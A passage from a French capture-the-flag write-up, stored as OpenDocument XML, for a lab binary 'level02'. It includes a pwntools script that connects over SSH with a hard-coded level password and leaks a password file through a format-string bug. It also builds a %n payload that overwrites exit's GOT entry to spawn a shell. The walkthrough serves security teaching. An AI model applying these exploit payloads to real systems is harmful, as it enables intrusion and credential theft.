      <text:p text:style-name="P15"><draw:frame draw:style-name="fr2" draw:name="images8" text:anchor-type="paragraph" svg:width="19.999cm" svg:height="3.609cm" draw:z-index="7"><draw:image xlink:href="Pictures/200000070000603A0000115EC3B0E791.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">&gt;&gt; </text:span><text:span text:style-name="T15">Exploitation manuelle</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P5">&gt; ./level02</text:p>
      <text:p text:style-name="P5">&gt; --[ Username: %22$p|%23$p|%24$p|%25$p|%26$p</text:p>
      <text:p text:style-name="P5"><text:soft-page-break/>&gt; --[ Password: aaaa</text:p>
      <text:p text:style-name="P5">&gt; Convert leaked values to ASCII (see exploit.py)</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">&gt;&gt; </text:span><text:span text:style-name="T15">Exploit automatique</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P12"><text:span text:style-name="T4">from</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T6">pwn</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T4">import</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T8">*</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:span text:style-name="T7">s</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">ssh(host=</text:span><text:span text:style-name="T12">"192.168.1.3"</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">port=</text:span><text:span text:style-name="T9">4242</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">user=</text:span><text:span text:style-name="T12">"level02"</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T7">password=</text:span><text:span text:style-name="T12">"PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv"</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T7">p</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">s.process(</text:span><text:span text:style-name="T12">"/home/users/level02/./level02"</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P11">p.recvline()</text:p>
      <text:p text:style-name="P11">p.recvline()</text:p>
      <text:p text:style-name="P11">p.recvline()</text:p>
      <text:p text:style-name="P11">p.recvline()</text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T7">p.sendline(b</text:span><text:span text:style-name="T12">"%22$p|%23$p|%24$p|%25$p|%26$p"</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T7">p.sendline(b</text:span><text:span text:style-name="T12">"aaaa"</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P11">p.recvline()</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:span text:style-name="T7">result</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">p.recvlineS()</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T7">result</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">result[:</text:span><text:span text:style-name="T9">95</text:span><text:span text:style-name="T7">]</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T7">chunks</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T7">result.split(</text:span><text:span text:style-name="T12">'|'</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T7">passw</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T12">''</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:span text:style-name="T3">for</text:span> <text:span text:style-name="T7">chunk</text:span> <text:span text:style-name="T3">in</text:span> <text:span text:style-name="T7">chunks</text:span> <text:span text:style-name="T7">:</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">ba</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T16">bytearray</text:span><text:span text:style-name="T7">.fromhex(chunk[</text:span><text:span text:style-name="T9">2</text:span><text:span text:style-name="T7">:])</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">ba.reverse()</text:span></text:p>
      <text:p text:style-name="P10"><text:s text:c="4"/><text:span text:style-name="T7">passw</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">ba.decode()</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P7"><text:span text:style-name="T16">print</text:span><text:span text:style-name="T7">(</text:span><text:span text:style-name="T12">"[+] Exfiltrated .pass from stack memory : "</text:span> <text:span text:style-name="T7">+</text:span> <text:span text:style-name="T7">passw)</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P4">MÉTHODE N°2<text:span text:style-name="T2">:</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P4"><text:span text:style-name="T2">Après avoir un peu réfléchi, il est en réalité également possible d'overwrite l'adresse </text:span>.got.plt <text:span text:style-name="T2">de la fonction </text:span>exit <text:span text:style-name="T2">afin de rediriger le flux d'exécution vers l'appel </text:span>system <text:span text:style-name="T2">effectué dans la fonction </text:span>main<text:span text:style-name="T2">. En effet, lorsqu'on exécute le programme de manière "normale" (ou avec notre payload précédent), rappelons que l'état de la stack est le suivant :</text:span></text:p>
      <text:p text:style-name="P15"><draw:frame draw:style-name="fr1" draw:name="images9" text:anchor-type="paragraph" svg:x="2.057cm" svg:y="0.397cm" svg:width="12.885cm" svg:height="5.794cm" draw:z-index="8"><draw:image xlink:href="Pictures/2000000700003256000016A319FB680A.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/><text:span text:style-name="T2">On a bien le contenu du fichier </text:span><text:span text:style-name="T1">.pass </text:span><text:span text:style-name="T2">en mémoire vers les adresses hautes, mais on a également un buffer (</text:span><text:span text:style-name="T1">buff3</text:span><text:span text:style-name="T2">) qui contient notre input pour le mot de passe. Ce buffer est initialement </text:span><text:span text:style-name="T1">rempli de 0</text:span><text:span text:style-name="T2"> ; que se passe-t-il alors si jamais on entre les bytes suivants :</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">\x28\x12\x60</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Alors, à l'adresse 0x7fffffffdf20 sera stockée l'adresse suivante : </text:span><text:span text:style-name="T14">0x0000000000601228</text:span><text:span text:style-name="T2">, soit l'adresse </text:span><text:span text:style-name="T1">.got.plt </text:span><text:span text:style-name="T2">de </text:span><text:span text:style-name="T1">exit</text:span><text:span text:style-name="T2"> ! On se sert donc des 0 déjà présents pour former notre adresse sans NULL BYTE dans notre input.</text:span></text:p>
      <text:p text:style-name="P15"><draw:frame draw:style-name="fr1" draw:name="images10" text:anchor-type="paragraph" svg:x="0.018cm" svg:y="0.302cm" svg:width="12.622cm" svg:height="5.77cm" draw:z-index="9"><draw:image xlink:href="Pictures/200000070000314E00001689C871C282.svm" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">On peut donc </text:span><text:span text:style-name="T1">faire pointer notre specifier %n </text:span><text:span text:style-name="T2">sur cette adresse de la stack afin d'y inscrire des bytes arbitraires. On détermine qu'il s'agit de </text:span><text:span text:style-name="T1">%8$n</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Attention cependant, on ne va pas pouvoir utiliser la technique de </text:span><text:span text:style-name="T1">Rainfall – level4 </text:span><text:span text:style-name="T2">qui consiste à écrire byte par byte à des adresses précises (0x601228 – 0x601229 – 0x601230 etc...) car on aurait pour cela besoin d'avoir ce pattern dans notre chaîne de format password :</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">0x0000000000601228 [DUMMY ADDR] 0x0000000000601229 [DUMMY ADDR] ...</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Ce qui suppose d'inscrire des '</text:span><text:span text:style-name="T1">\0</text:span><text:span text:style-name="T2">'. On peut cependant y aller en mode entièrement bourrin. On veut inscrire à l'adresse </text:span><text:span text:style-name="T1">.got.plt </text:span><text:span text:style-name="T2">de </text:span><text:span text:style-name="T1">exit </text:span><text:span text:style-name="T2">l'adresse 0x0000000000400a85 (début de l'appel </text:span><text:span text:style-name="T1">system</text:span><text:span text:style-name="T2"> dans main) ; on traduit ce chiffre en décimal, ce qui nous donne : </text:span><text:span text:style-name="T1">4196997</text:span><text:span text:style-name="T2">. On construit donc notre payload de cette manière :</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P12"><text:span text:style-name="T8">payload</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T8">=</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T8">b</text:span><text:span text:style-name="T13">''</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T7">payload</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T12">'%4196997x%8$n'</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T7">payload</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T12">'A'</text:span> <text:span text:style-name="T7">*</text:span> <text:span text:style-name="T7">(</text:span><text:span text:style-name="T9">99</text:span> <text:span text:style-name="T7">-</text:span> <text:span text:style-name="T16">len</text:span><text:span text:style-name="T7">(payload))</text:span></text:p>
      <text:p text:style-name="P10"><text:span text:style-name="T7">payload</text:span> <text:span text:style-name="T7">+=</text:span> <text:span text:style-name="T7">b</text:span><text:span text:style-name="T12">'\x28\x12\x60'</text:span></text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"><text:span text:style-name="T7">file</text:span> <text:span text:style-name="T7">=</text:span> <text:span text:style-name="T16">open</text:span><text:span text:style-name="T7">(</text:span><text:span text:style-name="T12">"payload"</text:span><text:span text:style-name="T7">,</text:span> <text:span text:style-name="T12">"wb"</text:span><text:span text:style-name="T7">)</text:span></text:p>
      <text:p text:style-name="P11">file.write(payload)</text:p>
      <text:p text:style-name="P6">file.close()</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">Le specifier </text:span><text:span text:style-name="T1">%8$n </text:span><text:span text:style-name="T2">nous permet d'écrire à l'adresse </text:span><text:span text:style-name="T14">0x0000000000601228</text:span><text:span text:style-name="T2"> ; le %4196997x nous permet d'inscrire l'hexadécimal </text:span><text:span text:style-name="T14">0x0000000000400a85</text:span><text:span text:style-name="T2"> à cet emplacement mémoire.</text:span></text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">Le terminal fait un peu la tronche avec autant de caractères à afficher, mais ça fonctionne, on a une shell.</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P3"><text:span text:style-name="T1">Got flag</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9M</meta:editing-duration>
    <meta:editing-cycles>4</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2021-12-05T14:38:58.52</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="10" meta:object-count="0" meta:page-count="7" meta:paragraph-count="130" meta:word-count="1420" meta:character-count="9248"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>